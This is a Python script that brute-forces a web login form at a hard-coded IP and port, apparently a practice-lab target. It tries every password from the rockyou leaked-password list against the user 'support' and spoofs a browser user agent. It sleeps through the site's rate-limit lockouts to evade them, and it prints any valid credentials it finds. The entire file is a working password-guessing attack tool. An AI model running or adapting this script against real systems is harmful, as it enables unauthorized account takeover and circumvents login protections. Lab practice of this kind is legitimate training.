"""import necessary libraries"""
import time
import requests

# define global constants and variables
# login user
USER: str = "support"

# file that contains passwords
# grep '[[:upper:]]' rockyou-50.txt | grep '[[:digit:]]' > testing.txt
PASSFILE:str = "/home/ds/repo/SecLists/Passwords/Leaked-Databases/rockyou.txt"

# create url using user and password as argument
BASE_URL:str = "http://94.237.49.166:43845/"
URL:str = BASE_URL + "login.php/"

# rate limit blocks for 30 seconds
LOCK_TIME:int = 30

# message that alert us we hit rate limit
LOCK_MESSAGE:str = "Too many login failures"

def send_login_request() -> None:
    """function to send http login request"""

    # define headers here as they don't need to be reloaded every loop
    headers = {
        'Content-Type' : 'application/x-www-form-urlencoded',
        'Referer' : URL,
        # fake user agent presenting as a chromium browser. change as needed
        "User-Agent": 
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 " +
        "(KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
    }

    # read user and password
    with open(PASSFILE, "r", encoding="utf-8") as passfile:
        for line in passfile:
            # skip comment
            if line.startswith("# "):
                continue

            # take password, join to keep password that contain a :
            password = line.strip("\n")

            # prepare POST data
            data = {
                'userid': USER,
                'passwd': password,
                'submit': 'submit',
                'rememberme': 'rememberme'
            }

            # do the request
            try:
                res = requests.post(URL, data=data, headers=headers, timeout=30)

                # Print request information
                # print("Sending request:")  # debug print
                # print("URL:", URL)  # debug print
                # print("Headers:", headers)  # debug print
                # print("Data:", data)  # debug print
                # print(res.request.body)  # debug print
                # print(res._content)  # debug print

                # handle generic credential error
                if "Invalid credentials" in res.text:
                    print(f"[-] Invalid credentials: userid:{USER} passwd:{password}")

                # hit rate limit, let's say we have to wait 30 seconds
                elif LOCK_MESSAGE in res.text:
                    with open("skip2.txt", "a", encoding="utf-8") as file:
                        file.write(password)
                    print(f"\n[!] Hit rate limit in {password}\n[*] sleeping {LOCK_TIME}\n")
                    # do the actual sleep plus 0.5 to be sure
                    time.sleep(LOCK_TIME+0.5)

                # user and password were valid !
                else:
                    print(f"\n[+++] Valid credentials: userid:{USER} passwd:{password} [+++]")
                    break
            
            except requests.exceptions.RequestException as e:
                print(f"An error occurred: {e}")


def main() -> None:
    """main function to execute"""
    send_login_request()

if __name__ == "__main__":
    main()
